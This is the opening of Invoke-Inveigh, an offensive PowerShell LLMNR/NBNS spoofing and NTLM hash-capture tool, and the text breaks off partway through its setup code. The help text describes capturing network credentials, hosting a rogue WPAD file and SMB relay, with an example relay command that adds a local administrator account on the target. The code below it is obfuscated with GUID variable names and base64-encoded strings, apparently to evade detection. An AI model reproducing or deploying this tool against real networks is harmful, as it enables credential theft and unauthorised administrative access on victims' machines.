Function Invoke-Inveigh
{

<#
.SYNOPSIS
Invoke-Inveigh is a Windows PowerShell LLMNR/NBNS spoofer with challenge/response capture over HTTP/HTTPS/SMB.
.DESCRIPTION
Invoke-Inveigh is a Windows PowerShell LLMNR/NBNS spoofer with the following features:
    IPv4 LLMNR/NBNS spoofer with granular control
    NTLMv1/NTLMv2 challenge/response capture over HTTP/HTTPS/SMB
    Basic auth cleartext credential capture over HTTP/HTTPS
    WPAD server capable of hosting a basic or custom wpad.dat file
    HTTP/HTTPS server capable of hosting limited content
    Granular control of console and file output
    Run time control
.PARAMETER IP
Specify a specific local IP address for listening. This IP address will also be used for LLMNR/NBNS spoofing if
the SpooferIP parameter is not set.
.PARAMETER SpooferIP
Specify an IP address for LLMNR/NBNS spoofing. This parameter is only necessary when redirecting victims to a
system other than the Inveigh host.
.PARAMETER SpooferHostsReply
Default = All: Comma separated list of requested hostnames to respond to when spoofing with LLMNR and NBNS.
.PARAMETER SpooferHostsIgnore
Default = All: Comma separated list of requested hostnames to ignore when spoofing with LLMNR and NBNS.
.PARAMETER SpooferIPsReply
Default = All: Comma separated list of source IP addresses to respond to when spoofing with LLMNR and NBNS.
.PARAMETER SpooferIPsIgnore
Default = All: Comma separated list of source IP addresses to ignore when spoofing with LLMNR and NBNS.
.PARAMETER SpooferRepeat
Default = Enabled: (Y/N) Enable/Disable repeated LLMNR/NBNS spoofs to a victim system after one user
challenge/response has been captured.
.PARAMETER LLMNR
Default = Enabled: (Y/N) Enable/Disable LLMNR spoofing.
.PARAMETER LLMNRTTL
Default = 30 Seconds: Specify a custom LLMNR TTL in seconds for the response packet.
.PARAMETER NBNS
Default = Disabled: (Y/N) Enable/Disable NBNS spoofing.
.PARAMETER NBNSTTL
Default = 165 Seconds: Specify a custom NBNS TTL in seconds for the response packet.
.PARAMETER NBNSTypes
Default = 00,20: Comma separated list of NBNS types to spoof.
Types include 00 = Workstation Service, 03 = Messenger Service, 20 = Server Service, 1B = Domain Name
.PARAMETER HTTP
Default = Enabled: (Y/N) Enable/Disable HTTP challenge/response capture.
.PARAMETER HTTPS
Default = Disabled: (Y/N) Enable/Disable HTTPS challenge/response capture. Warning, a cert will be installed in
the local store and attached to port 443. If the script does not exit gracefully, execute 
"netsh http delete sslcert ipport=0.0.0.0:443" and manually remove the certificate from "Local Computer\Personal"
in the cert store.
.PARAMETER HTTPAuth
Default = NTLM: (Anonymous,Basic,NTLM) Specify the HTTP/HTTPS server authentication type. This setting does not
apply to wpad.dat requests.
.PARAMETER HTTPBasicRealm
Specify a realm name for Basic authentication. This parameter applies to both HTTPAuth and WPADAuth.
.PARAMETER HTTPDir
Specify a full directory path to enable hosting of basic content through the HTTP/HTTPS listener.
.PARAMETER HTTPDefaultFile
Specify a filename within the HTTPDir to serve as the default HTTP/HTTPS response file. This file will not be used
for wpad.dat requests.
.PARAMETER HTTPDefaultEXE
Specify an EXE filename within the HTTPDir to serve as the default HTTP/HTTPS response for EXE requests. 
.PARAMETER HTTPResponse
Specify a string or HTML to serve as the default HTTP/HTTPS response. This response will not be used for wpad.dat
requests. This parameter will not be used if HTTPDir is set. Use PowerShell character escapes where necessary. 
.PARAMETER HTTPSCertAppID
Specify a valid application GUID for use with the ceriticate.
.PARAMETER HTTPSCertThumbprint
Specify a certificate thumbprint for use with a custom certificate. The certificate filename must be located in
the current working directory and named Inveigh.pfx.
.PARAMETER WPADAuth
Default = NTLM: (Anonymous,Basic,NTLM) Specify the HTTP/HTTPS server authentication type for wpad.dat requests.
Setting to Anonymous can prevent browser login prompts.
.PARAMETER WPADEmptyFile
Default = Enabled: (Y/N) Enable/Disable serving a proxyless, all direct, wpad.dat file for wpad.dat requests.
Enabling this setting can reduce the amount of redundant wpad.dat requests. This parameter is ignored when
using WPADIP, WPADPort, or WPADResponse.
.PARAMETER WPADIP
Specify a proxy server IP to be included in a basic wpad.dat response for WPAD enabled browsers. This parameter
must be used with WPADPort.
.PARAMETER WPADPort
Specify a proxy server port to be included in a basic wpad.dat response for WPAD enabled browsers. This parameter
must be used with WPADIP.
.PARAMETER WPADDirectHosts
Comma separated list of hosts to list as direct in the wpad.dat file. Listed hosts will not be routed through the
defined proxy.
.PARAMETER WPADResponse
Specify wpad.dat file contents to serve as the wpad.dat response. This parameter will not be used if WPADIP and
WPADPort are set. Use PowerShell character escapes where necessary.
.PARAMETER SMB
Default = Enabled: (Y/N) Enable/Disable SMB challenge/response capture. Warning, LLMNR/NBNS spoofing can still
direct targets to the host system's SMB server. Block TCP ports 445/139 or kill the SMB services if you need to
prevent login requests from being processed by the Inveigh host.  
.PARAMETER Challenge
Default = Random: Specify a 16 character hex NTLM challenge for use with the HTTP listener. If left blank, a
random challenge will be generated for each request. This will only be used for non-relay captures.
.PARAMETER MachineAccounts
Default = Disabled: (Y/N) Enable/Disable showing NTLM challenge/response captures from machine accounts.
.PARAMETER SMBRelay
Default = Disabled: (Y/N) Enable/Disable SMB relay. Note that Inveigh-Relay.ps1 must be loaded into memory.
.PARAMETER SMBRelayTarget
IP address of system to target for SMB relay.
.PARAMETER SMBRelayCommand
Command to execute on SMB relay target.
.PARAMETER SMBRelayUsernames
Default = All Usernames: Comma separated list of usernames to use for relay attacks. Accepts both username and
domain\username format. 
.PARAMETER SMBRelayAutoDisable
Default = Enable: (Y/N) Automaticaly disable SMB relay after a successful command execution on target.
.PARAMETER SMBRelayNetworkTimeout
Default = No Timeout: (Integer) Set the duration in seconds that Inveigh will wait for a reply from the SMB relay
 target after each packet is sent.
.PARAMETER ConsoleOutput
Default = Disabled: (Y/N) Enable/Disable real time console output. If using this option through a shell, test to
ensure that it doesn't hang the shell.
.PARAMETER ConsoleStatus
(Integer) Set interval in minutes for displaying all unique captured hashes and credentials. This is useful for
displaying full capture lists when running through a shell that does not have access to the support functions.
.PARAMETER ConsoleUnique
Default = Enabled: (Y/N) Enable/Disable displaying challenge/response hashes for only unique IP, domain/hostname,
and username combinations when real time console output is enabled.
.PARAMETER FileOutput
Default = Disabled: (Y/N) Enable/Disable real time file output.
.PARAMETER FileUnique
Default = Enabled: (Y/N) Enable/Disable outputting challenge/response hashes for only unique IP, domain/hostname,
and username combinations when real time file output is enabled.
.PARAMETER StatusOutput
Default = Enabled: (Y/N) Enable/Disable startup and shutdown messages.
.PARAMETER OutputStreamOnly
Default = Disabled: (Y/N) Enable/Disable forcing all output to the standard output stream. This can be helpful if
running Inveigh through a shell that does not return other output streams.Note that you will not see the various
yellow warning messages if enabled.
.PARAMETER OutputDir
Default = Working Directory: Set a valid path to an output directory for log and capture files. FileOutput must
also be enabled.
.PARAMETER RunTime
(Integer) Set the run time duration in minutes.
.PARAMETER ShowHelp
Default = Enabled: (Y/N) Enable/Disable the help messages at startup.
.PARAMETER Inspect
(Switch) Disable LLMNR, NBNS, HTTP, HTTPS, and SMB in order to only inspect LLMNR/NBNS traffic.
.PARAMETER Tool
Default = 0: (0,1,2) Enable/Disable features for better operation through external tools such as Metasploit's
Interactive Powershell Sessions and Empire. 0 = None, 1 = Metasploit, 2 = Empire   
.EXAMPLE
Import-Module .\Inveigh.psd1;Invoke-Inveigh
Import full module and execute with all default settings.
.EXAMPLE
. ./Inveigh.ps1;Invoke-Inveigh -IP 192.168.1.10
Dot source load and execute specifying a specific local listening/spoofing IP.
.EXAMPLE
Invoke-Inveigh -IP 192.168.1.10 -HTTP N
Execute specifying a specific local listening/spoofing IP and disabling HTTP challenge/response.
.EXAMPLE
Invoke-Inveigh -SpooferRepeat N -WPADAuth Anonymous -SpooferHostsReply host1,host2 -SpooferIPsReply 192.168.2.75,192.168.2.76
Execute with the stealthiest options.
.EXAMPLE
Invoke-Inveigh -Inspect
Execute with LLMNR, NBNS, SMB, HTTP, and HTTPS disabled in order to only inpect LLMNR/NBNS traffic.
.EXAMPLE
Invoke-Inveigh -IP 192.168.1.10 -SpooferIP 192.168.2.50 -HTTP N
Execute specifying a specific local listening IP and a LLMNR/NBNS spoofing IP on another subnet. This may be
useful for sending traffic to a controlled Linux system on another subnet.
.EXAMPLE
Invoke-Inveigh -HTTPResponse "<html><head><meta http-equiv='refresh' content='0; url=https://duckduckgo.com/'></head></html>"
Execute specifying an HTTP redirect response.
.EXAMPLE
Invoke-Inveigh -SMBRelay y -SMBRelayTarget 192.168.2.55 -SMBRelayCommand "net user Dave Spring2016 /add && net localgroup administrators Dave /add"
Execute with SMB relay enabled with a command that will create a local administrator account on the SMB relay
target.  
.NOTES
1. An elevated administrator or SYSTEM shell is needed.
2. Currently supports IPv4 LLMNR/NBNS spoofing and HTTP/HTTPS/SMB NTLMv1/NTLMv2 challenge/response capture.
3. LLMNR/NBNS spoofing is performed through sniffing and sending with raw sockets.
4. SMB challenge/response captures are performed by sniffing over the host system's SMB service.
5. HTTP challenge/response captures are performed with a dedicated listener.
6. The local LLMNR/NBNS services do not need to be disabled on the host system.
7. LLMNR/NBNS spoofer will point victims to host system's SMB service, keep account lockout scenarios in mind.
8. Kerberos should downgrade for SMB authentication due to spoofed hostnames not being valid in DNS.
9. Ensure that the LMMNR,NBNS,SMB,HTTP ports are open within any local firewall on the host system.
10. If you copy/paste challenge/response captures from output window for password cracking, remove carriage returns.
.LINK
https://github.com/Kevin-Robertson/Inveigh
#>


param
( 
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]${a9712376a14345acb0046b599ac35510}="Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]${e55cd4a3edc2409f9544ab260c7793e4}="N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]${b8a133e08e4b4881a9cfa933aa78c19b}="Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]${dcac5669feaa43bda9605b66542e90eb}="Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]${e02740c242b24642905a7b9f9b2a7776}="N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]${a1317be5b5a3449d9e91b8ec5e3d7e56}="Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]${d8e92100d54447b7b088ed5415a01d86}="N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]${b2eefd58abcb4861a36bf6a0ff6b0a34}="N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]${c3b26ee965da47e58a0097be89c14dd4}="Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]${bfdcf2949399434cbe1dbd7d868dc314}="N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]${d4dc92f8b9e04a91be5eb7099818dc83}="N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]${af68946a97ec4589b2fac87862a490ac}="Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]${db77efe80dee43d796b1ffc2102b7549}="N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]${d13b898c18954d6ba46625e1ae98c5ee}="Y",
    [parameter(Mandatory=$false)][ValidateSet("0","1","2")][string]${aba1f06cc6764377a7b6ab2ceccdaec9}="0",
    [parameter(Mandatory=$false)][ValidateSet("Anonymous","Basic","NTLM")][string]${edc4d2f44c8e4e63b7b00dfe56110aca}="NTLM",
    [parameter(Mandatory=$false)][ValidateSet("Anonymous","Basic","NTLM")][string]${e0502cdf78554c8c80746316292c02fb}="NTLM",
    [parameter(Mandatory=$false)][ValidateSet("00","03","20","1B","1C","1D","1E")][array]${c9cd43846ba641a4bd0d1bdc810d0f50}=@("00","20"),
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [IPAddress]$_ })][string]${abd19e74908a450e847564f92e2000eb}="",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [IPAddress]$_ })][string]${cd4629bb22504e88a1343d2e9edd39ef}="",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [IPAddress]$_ })][string]${a92483ab142f4ed2ba1088d321e8e51f} = "",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [IPAddress]$_ })][string]${c528a2182bb047f79bcfe29c2916df12} ="",
    [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][string]${bd55bad8d04f4ca6bcf3dcf5ccc64450}="",
    [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][string]${d3d61740e8344c5bac50eef0abaaac1e}="",
    [parameter(Mandatory=$false)][ValidatePattern('^[A-Fa-f0-9]{16}$')][string]${b7f8429563d14b3f96fff20409dd76ec}="",
    [parameter(Mandatory=$false)][array]${d70c9d958dd44a10be0c532f517e3ef9}="",
    [parameter(Mandatory=$false)][array]${a73d854ec3594cb5ac43e5562413d1c1}="",
    [parameter(Mandatory=$false)][array]${bd1d14dc52ab4d71ab33f77ef0ab851a}="",
    [parameter(Mandatory=$false)][array]${ab5c9a3797aa40cf86faf228516f1393}="",
    [parameter(Mandatory=$false)][array]${a85dc65b1229497dbdd4fc6a88a3775c}="",
    [parameter(Mandatory=$false)][array]${b7db70e89e0a475da76fbc5ffcd7b001}="",
    [parameter(Mandatory=$false)][int]${dee7bdc3a9b748e894d764b79a5e7e1c}="30",
    [parameter(Mandatory=$false)][int]${e6e42c54e98044ba98fdf24d79b5f9ee}="165",
    [parameter(Mandatory=$false)][int]${c9a4135aa8c04921b380d6390d87f594}="",
    [parameter(Mandatory=$false)][int]${e1ee1c6aeb484ee2af1947e459200566}="",
    [parameter(Mandatory=$false)][int]${e6abfec0dea646f69b1a2c989ebdcdbb}="",
    [parameter(Mandatory=$false)][string]${aee1694b16de43f98158814241da1ee1}="IIS",
    [parameter(Mandatory=$false)][string]${ec7a5c6fb4274258a6453827d5fed342}="",
    [parameter(Mandatory=$false)][string]${d20b2d2f2ef14e248b8925537c31c224}="",
    [parameter(Mandatory=$false)][string]${a462c15526384fd8bc3d9987e501370b}="",
    [parameter(Mandatory=$false)][string]${dc32fcaed6224d1588a53e6f2bc8a76f}="00112233-4455-6677-8899-AABBCCDDEEFF",
    [parameter(Mandatory=$false)][string]${d3e4b31d632c4e23918a42b78b0c2605}="98c1d54840c5c12ced710758b6ee56cc62fa1f0d",
    [parameter(Mandatory=$false)][string]${eee8604b57284ad4b3f04f6007b25eb5}="",   
    [parameter(Mandatory=$false)][string]${aed8122c078d4b3fae5f8b6517ed3f70}="", 
    [parameter(Mandatory=$false)][switch]${d4a9135947c24d23b0ba2deb3a7b9ec4}, 
    [parameter(ValueFromRemainingArguments=$true)]${e931bd909e564a0e8ba4c9d3d19d8938}
)
if (${e931bd909e564a0e8ba4c9d3d19d8938})
{
    throw "$(${e931bd909e564a0e8ba4c9d3d19d8938}) is not a valid parameter."
}
if(!${abd19e74908a450e847564f92e2000eb})
{ 
    ${abd19e74908a450e847564f92e2000eb} = (Test-Connection 127.0.0.1 -count 1 | select -ExpandProperty Ipv4Address)
}
if(!${cd4629bb22504e88a1343d2e9edd39ef})
{
    ${cd4629bb22504e88a1343d2e9edd39ef} = ${abd19e74908a450e847564f92e2000eb}  
}
if(${db77efe80dee43d796b1ffc2102b7549} -eq 'y')
{
    if(!${c528a2182bb047f79bcfe29c2916df12})
    {
        Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBvAHUAIABtAHUAcwB0ACAAcwBwAGUAYwBpAGYAeQAgAGEAbgAgAC0AUwBNAEIAUgBlAGwAYQB5AFQAYQByAGcAZQB0ACAAaQBmACAAZQBuAGEAYgBsAGkAbgBnACAALQBTAE0AQgBSAGUAbABhAHkA')))
    }
    if(!${aed8122c078d4b3fae5f8b6517ed3f70})
    {
        Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBvAHUAIABtAHUAcwB0ACAAcwBwAGUAYwBpAGYAeQAgAGEAbgAgAC0AUwBNAEIAUgBlAGwAYQB5AEMAbwBtAG0AYQBuAGQAIABpAGYAIABlAG4AYQBiAGwAaQBuAGcAIAAtAFMATQBCAFIAZQBsAGEAeQA=')))
    }
    if(${b7f8429563d14b3f96fff20409dd76ec} -or ${ec7a5c6fb4274258a6453827d5fed342} -or ${d20b2d2f2ef14e248b8925537c31c224} -or ${a462c15526384fd8bc3d9987e501370b} -or ${a92483ab142f4ed2ba1088d321e8e51f} -or ${c9a4135aa8c04921b380d6390d87f594} -or ${eee8604b57284ad4b3f04f6007b25eb5})
    {
        Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQBDAGgAYQBsAGwAZQBuAGcAZQAgAC0ASABUAFQAUABEAGUAZgBhAHUAbAB0AEYAaQBsAGUALAAgAC0ASABUAFQAUABEAGUAZgBhAHUAbAB0AEUAWABFACwAIAAtAEgAVABUAFAAUgBlAHMAcABvAG4AcwBlACwAIAAtAFcAUABBAEQASQBQACwAIAAtAFcAUABBAEQAUABvAHIAdAAsACAAYQBuAGQAIAAtAFcAUABBAEQAUgBlAHMAcABvAG4AcwBlACAAYwBhAG4AIABuAG8AdAAgAGIAZQAgAHUAcwBlAGQAIAB3AGgAZQBuACAAZQBuAGEAYgBsAGkAbgBnACAALQBTAE0AQgBSAGUAbABhAHkA')))
    }
    elseif(${edc4d2f44c8e4e63b7b00dfe56110aca} -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQA='))) -or ${e0502cdf78554c8c80746316292c02fb} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAaQBjAA=='))))
    {
        Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBuAGwAeQAgAC0ASABUAFQAUABBAHUAdABoACAATgBUAEwATQAsACAALQBXAFAAQQBEAEEAdQB0AGgAIABOAFQATABNACwAIABhAG4AZAAgAC0AVwBQAEEARABBAHUAdABoACAAQQBuAG8AbgB5AG0AbwB1AHMAIABjAGEAbgAgAGIAZQAgAHUAcwBlAGQAIAB3AGgAZQBuACAAZQBuAGEAYgBsAGkAbgBnACAALQBTAE0AQgBSAGUAbABhAHkA')))
    }
}
if(${ec7a5c6fb4274258a6453827d5fed342} -or ${d20b2d2f2ef14e248b8925537c31c224})
{
    if(!${bd55bad8d04f4ca6bcf3dcf5ccc64450})
    {
        Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBvAHUAIABtAHUAcwB0ACAAcwBwAGUAYwBpAGYAeQAgAGEAbgAgAC0ASABUAFQAUABEAGkAcgAgAHcAaABlAG4AIAB1AHMAaQBuAGcAIABlAGkAdABoAGUAcgAgAC0ASABUAFQAUABEAGUAZgBhAHUAbAB0AEYAaQBsAGUAIABvAHIAIAAtAEgAVABUAFAARABlAGYAYQB1AGwAdABFAFgARQA=')))
    }
}
if(${a92483ab142f4ed2ba1088d321e8e51f} -or ${c9a4135aa8c04921b380d6390d87f594})
{
    if(!${a92483ab142f4ed2ba1088d321e8e51f})
    {
        Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBvAHUAIABtAHUAcwB0ACAAcwBwAGUAYwBpAGYAeQAgAGEAIAAtAFcAUABBAEQAUABvAHIAdAAgAHQAbwAgAGcAbwAgAHcAaQB0AGgAIAAtAFcAUABBAEQASQBQAA==')))
    }
    if(!${c9a4135aa8c04921b380d6390d87f594})
    {
        Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBvAHUAIABtAHUAcwB0ACAAcwBwAGUAYwBpAGYAeQAgAGEAIAAtAFcAUABBAEQASQBQACAAdABvACAAZwBvACAAdwBpAHQAaAAgAC0AVwBQAEEARABQAG8AcgB0AA==')))
    }
}
if(!${d3d61740e8344c5bac50eef0abaaac1e})
{ 
    ${7cf71f7093ec4285942d4f29ad2e193e} = $PWD.Path
}
else
{
    ${7cf71f7093ec4285942d4f29ad2e193e} = ${d3d61740e8344c5bac50eef0abaaac1e}
}
if(!${98a67e4723ee472fa2340d2ec14a0f94})
{
    ${global:98a67e4723ee472fa2340d2ec14a0f94} = [hashtable]::Synchronized(@{})
    ${98a67e4723ee472fa2340d2ec14a0f94}.log = New-Object System.Collections.ArrayList
    ${98a67e4723ee472fa2340d2ec14a0f94}.NTLMv1_list = New-Object System.Collections.ArrayList
    ${98a67e4723ee472fa2340d2ec14a0f94}.NTLMv2_list = New-Object System.Collections.ArrayList
    ${98a67e4723ee472fa2340d2ec14a0f94}.cleartext_list = New-Object System.Collections.ArrayList
    ${98a67e4723ee472fa2340d2ec14a0f94}.IP_capture_list = @()
    ${98a67e4723ee472fa2340d2ec14a0f94}.SMBRelay_failed_list = @()
}
if(${98a67e4723ee472fa2340d2ec14a0f94}.running)
{
    Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBJAG4AdgBlAGkAZwBoACAAaQBzACAAYQBsAHIAZQBhAGQAeQAgAHIAdQBuAG4AaQBuAGcALAAgAHUAcwBlACAAUwB0AG8AcAAtAEkAbgB2AGUAaQBnAGgA')))
}
elseif(${98a67e4723ee472fa2340d2ec14a0f94}.relay_running)
{
    Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBJAG4AdgBlAGkAZwBoAFIAZQBsAGEAeQAgAGkAcwAgAGEAbAByAGUAYQBkAHkAIAByAHUAbgBuAGkAbgBnACwAIAB1AHMAZQAgAFMAdABvAHAALQBJAG4AdgBlAGkAZwBoAA==')))
}
${98a67e4723ee472fa2340d2ec14a0f94}.sniffer_socket = $null
if(${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_listener.IsListening)
{
    ${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_listener.Stop()
    ${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_listener.Close()
}
${98a67e4723ee472fa2340d2ec14a0f94}.console_queue = New-Object System.Collections.ArrayList
${98a67e4723ee472fa2340d2ec14a0f94}.status_queue = New-Object System.Collections.ArrayList
${98a67e4723ee472fa2340d2ec14a0f94}.log_file_queue = New-Object System.Collections.ArrayList
${98a67e4723ee472fa2340d2ec14a0f94}.NTLMv1_file_queue = New-Object System.Collections.ArrayList
${98a67e4723ee472fa2340d2ec14a0f94}.NTLMv2_file_queue = New-Object System.Collections.ArrayList
${98a67e4723ee472fa2340d2ec14a0f94}.cleartext_file_queue = New-Object System.Collections.ArrayList
${98a67e4723ee472fa2340d2ec14a0f94}.certificate_application_ID = ${dc32fcaed6224d1588a53e6f2bc8a76f}
${98a67e4723ee472fa2340d2ec14a0f94}.certificate_thumbprint = ${d3e4b31d632c4e23918a42b78b0c2605}
${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_challenge_queue = New-Object System.Collections.ArrayList
${98a67e4723ee472fa2340d2ec14a0f94}.console_output = $false
${98a67e4723ee472fa2340d2ec14a0f94}.console_input = $true
${98a67e4723ee472fa2340d2ec14a0f94}.file_output = $false
${98a67e4723ee472fa2340d2ec14a0f94}.log_out_file = ${7cf71f7093ec4285942d4f29ad2e193e} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABJAG4AdgBlAGkAZwBoAC0ATABvAGcALgB0AHgAdAA=')))
${98a67e4723ee472fa2340d2ec14a0f94}.NTLMv1_out_file = ${7cf71f7093ec4285942d4f29ad2e193e} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABJAG4AdgBlAGkAZwBoAC0ATgBUAEwATQB2ADEALgB0AHgAdAA=')))
${98a67e4723ee472fa2340d2ec14a0f94}.NTLMv2_out_file = ${7cf71f7093ec4285942d4f29ad2e193e} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABJAG4AdgBlAGkAZwBoAC0ATgBUAEwATQB2ADIALgB0AHgAdAA=')))
${98a67e4723ee472fa2340d2ec14a0f94}.cleartext_out_file = ${7cf71f7093ec4285942d4f29ad2e193e} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABJAG4AdgBlAGkAZwBoAC0AQwBsAGUAYQByAHQAZQB4AHQALgB0AHgAdAA=')))
${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_response = ${a462c15526384fd8bc3d9987e501370b}
${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_directory = ${bd55bad8d04f4ca6bcf3dcf5ccc64450}
${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_default_file = ${ec7a5c6fb4274258a6453827d5fed342}
${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_default_exe = ${d20b2d2f2ef14e248b8925537c31c224}
${98a67e4723ee472fa2340d2ec14a0f94}.WPAD_response = ${eee8604b57284ad4b3f04f6007b25eb5}
${98a67e4723ee472fa2340d2ec14a0f94}.challenge = ${b7f8429563d14b3f96fff20409dd76ec}
${98a67e4723ee472fa2340d2ec14a0f94}.running = $true
if(${c3b26ee965da47e58a0097be89c14dd4} -eq 'y')
{
    ${98a67e4723ee472fa2340d2ec14a0f94}.status_output = $true
}
else
{
    ${98a67e4723ee472fa2340d2ec14a0f94}.status_output = $false
}
if(${bfdcf2949399434cbe1dbd7d868dc314} -eq 'y')
{
    ${98a67e4723ee472fa2340d2ec14a0f94}.output_stream_only = $true
}
else
{
    ${98a67e4723ee472fa2340d2ec14a0f94}.output_stream_only = $false
}
if(${d4a9135947c24d23b0ba2deb3a7b9ec4})
{
    ${dcac5669feaa43bda9605b66542e90eb} = "N"
    ${e02740c242b24642905a7b9f9b2a7776} = "N"
    ${a9712376a14345acb0046b599ac35510} = "N"
    ${e55cd4a3edc2409f9544ab260c7793e4} = "N"
    ${b8a133e08e4b4881a9cfa933aa78c19b} = "N"
}
if(${aba1f06cc6764377a7b6ab2ceccdaec9} -eq 1) 
{
    ${98a67e4723ee472fa2340d2ec14a0f94}.tool = 1
    ${98a67e4723ee472fa2340d2ec14a0f94}.output_stream_only = $true
    ${98a67e4723ee472fa2340d2ec14a0f94}.newline = ""
    ${d8e92100d54447b7b088ed5415a01d86} = "N"
}
elseif(${aba1f06cc6764377a7b6ab2ceccdaec9} -eq 2) 
{
    ${98a67e4723ee472fa2340d2ec14a0f94}.tool = 2
    ${98a67e4723ee472fa2340d2ec14a0f94}.output_stream_only = $true
    ${98a67e4723ee472fa2340d2ec14a0f94}.console_input = $false
    ${98a67e4723ee472fa2340d2ec14a0f94}.newline = "`n"
    ${d8e92100d54447b7b088ed5415a01d86} = "Y"
    ${af68946a97ec4589b2fac87862a490ac} = "N"
}
else
{
    ${98a67e4723ee472fa2340d2ec14a0f94}.tool = 0
    ${98a67e4723ee472fa2340d2ec14a0f94}.newline = ""
}
${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.add("Inveigh started at $(Get-Date -format 's')")|Out-Null
${98a67e4723ee472fa2340d2ec14a0f94}.log.add(${98a67e4723ee472fa2340d2ec14a0f94}.log_file_queue[${98a67e4723ee472fa2340d2ec14a0f94}.log_file_queue.add("$(Get-Date -format 's') - Inveigh started")]) |Out-Null
${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.add("Listening IP Address = ${abd19e74908a450e847564f92e2000eb}") |Out-Null
${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.add("LLMNR/NBNS Spoofer IP Address = ${cd4629bb22504e88a1343d2e9edd39ef}")|Out-Null
if(${dcac5669feaa43bda9605b66542e90eb} -eq 'y')
{
    ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABMAE0ATgBSACAAUwBwAG8AbwBmAGkAbgBnACAARQBuAGEAYgBsAGUAZAA='))))|Out-Null
    ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.add("LLMNR TTL = ${dee7bdc3a9b748e894d764b79a5e7e1c} Seconds")|Out-Null
    ${c5db9900dc8d4a1986872012ce91b73b} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAgAHMAcABvAG8AZgBlAGQAIAByAGUAcwBwAG8AbgBzAGUAIABoAGEAcwAgAGIAZQBlAG4AIABzAGUAbgB0AA==')))
}
else
{
    ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABMAE0ATgBSACAAUwBwAG8AbwBmAGkAbgBnACAARABpAHMAYQBiAGwAZQBkAA=='))))|Out-Null
    ${c5db9900dc8d4a1986872012ce91b73b} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAgAEwATABNAE4AUgAgAHMAcABvAG8AZgBpAG4AZwAgAGkAcwAgAGQAaQBzAGEAYgBsAGUAZAA=')))
}
if(${e02740c242b24642905a7b9f9b2a7776} -eq 'y')
{
    ${b846828b2dfd43a5b0df14e70687d63e} = ${c9cd43846ba641a4bd0d1bdc810d0f50} -join ","
    if(${c9cd43846ba641a4bd0d1bdc810d0f50}.Count -eq 1)
    {
        ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.add("NBNS Spoofing Of Type ${b846828b2dfd43a5b0df14e70687d63e} Enabled")|Out-Null
    }
    else
    {
        ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.add("NBNS Spoofing Of Types ${b846828b2dfd43a5b0df14e70687d63e} Enabled")|Out-Null
    }
    ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.add("NBNS TTL = ${e6e42c54e98044ba98fdf24d79b5f9ee} Seconds")|Out-Null
    ${7e494e4ea1a0426ab7d62b9675e564b6} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAgAHMAcABvAG8AZgBlAGQAIAByAGUAcwBwAG8AbgBzAGUAIABoAGEAcwAgAGIAZQBlAG4AIABzAGUAbgB0AA==')))
}
else
{
    ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBCAE4AUwAgAFMAcABvAG8AZgBpAG4AZwAgAEQAaQBzAGEAYgBsAGUAZAA='))))|Out-Null
